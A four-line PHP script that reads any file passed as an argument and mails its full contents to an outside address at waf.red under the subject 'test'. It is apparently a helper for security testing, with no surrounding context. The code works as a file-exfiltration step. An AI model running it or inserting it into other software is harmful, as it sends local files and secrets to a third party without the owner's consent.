<?php
  $f = file_get_contents($argv[1]);
  mail("themiddle@waf.red", "test", $f, "From: theMiddle <noreply@waf.red>\r\n");
?>
